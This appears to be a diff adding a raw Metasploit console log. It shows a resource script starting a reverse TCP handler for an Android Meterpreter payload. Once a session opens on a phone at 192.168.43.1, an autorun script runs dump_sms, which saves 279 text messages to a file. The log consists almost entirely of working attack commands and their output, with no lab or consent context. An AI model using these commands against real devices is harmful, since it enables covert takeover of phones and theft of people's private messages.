@@ -1,0 +1,67 @@
+C:\root\Desktop\metasploit\scripts\before> msfconsole -r s_l1.rc           
+                                                  
+               .;lxO0KXXXK0Oxl:.
+           ,o0WMMMMMMMMMMMMMMMMMMKd,
+        'xNMMMMMMMMMMMMMMMMMMMMMMMMMWx,
+      :KMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMK:
+    .KMMMMMMMMMMMMMMMWNNNWMMMMMMMMMMMMMMMX,
+   lWMMMMMMMMMMMXd:..     ..;dKMMMMMMMMMMMMo
+  xMMMMMMMMMMWd.               .oNMMMMMMMMMMk
+ oMMMMMMMMMMx.                    dMMMMMMMMMMx
+.WMMMMMMMMM:                       :MMMMMMMMMM,
+xMMMMMMMMMo                         lMMMMMMMMMO
+NMMMMMMMMW                    ,cccccoMMMMMMMMMWlccccc;
+MMMMMMMMMX                     ;KMMMMMMMMMMMMMMMMMMX:
+NMMMMMMMMW.                      ;KMMMMMMMMMMMMMMX:
+xMMMMMMMMMd                        ,0MMMMMMMMMMK;
+.WMMMMMMMMMc                         'OMMMMMM0,
+ lMMMMMMMMMMk.                         .kMMO'
+  dMMMMMMMMMMWd'                         ..
+   cWMMMMMMMMMMMNxc'.                ##########
+    .0MMMMMMMMMMMMMMMMWc            #+#    #+#
+      ;0MMMMMMMMMMMMMMMo.          +:+
+        .dNMMMMMMMMMMMMo          +#++:++#+
+           'oOWMMMMMMMMo                +:+
+               .,cdkO0K;        :+:    :+:                                
+                                :::::::+:
+                      Metasploit
+
+       =[ metasploit v5.0.66-dev                          ]
++ -- --=[ 1957 exploits - 1089 auxiliary - 336 post       ]
++ -- --=[ 558 payloads - 45 encoders - 10 nops            ]
++ -- --=[ 7 evasion                                       ]
+
+[*] Processing s_l1.rc for ERB directives.
+resource (s_l1.rc)> use exploit/multi/handler
+resource (s_l1.rc)> set payload android/meterpreter/reverse_tcp
+payload => android/meterpreter/reverse_tcp
+resource (s_l1.rc)> set lport 4321
+lport => 4321
+resource (s_l1.rc)> set lhost 0.0.0.0
+lhost => 0.0.0.0
+resource (s_l1.rc)> exploit -o
+[*] Started reverse TCP handler on 0.0.0.0:4321 
+^C[-] Exploit failed [user-interrupt]: Interrupt 
+[-] exploit: Interrupted
+resource (s_l1.rc)> sleep 2
+^C[-] sleep: Interrupted
+msf5 exploit(multi/handler) > set auto
+set autoloadstdapi            set autorunscript             set autosysteminfo            set autounhookprocess         set autoverifysession         set autoverifysessiontimeout
+msf5 exploit(multi/handler) > set auto
+set autoloadstdapi            set autorunscript             set autosysteminfo            set autounhookprocess         set autoverifysession         set autoverifysessiontimeout
+msf5 exploit(multi/handler) > set autorunscript /root/Desktop/metasploit/scripts/after/ar_s_l1.rc 
+autorunscript => /root/Desktop/metasploit/scripts/after/ar_s_l1.rc
+msf5 exploit(multi/handler) > set payload android/meterpreter/reverse_tcp
+payload => android/meterpreter/reverse_tcp
+msf5 exploit(multi/handler) > exploit 
+
+[*] Started reverse TCP handler on 0.0.0.0:4321 
+[*] Sending stage (73550 bytes) to 192.168.43.1
+[*] Meterpreter session 1 opened (192.168.43.164:4321 -> 192.168.43.1:34208) at 2020-01-02 20:02:24 +0530
+[*] Session ID 1 (192.168.43.164:4321 -> 192.168.43.1:34208) processing AutoRunScript '/root/Desktop/metasploit/scripts/after/ar_s_l1.rc'
+[*] Processing /root/Desktop/metasploit/scripts/after/ar_s_l1.rc for ERB directives.
+resource (/root/Desktop/metasploit/scripts/after/ar_s_l1.rc)> dump_sms
+[*] Fetching 279 sms messages
+[*] SMS messages saved to: sms_dump_20200102200226.txt
+
+ 
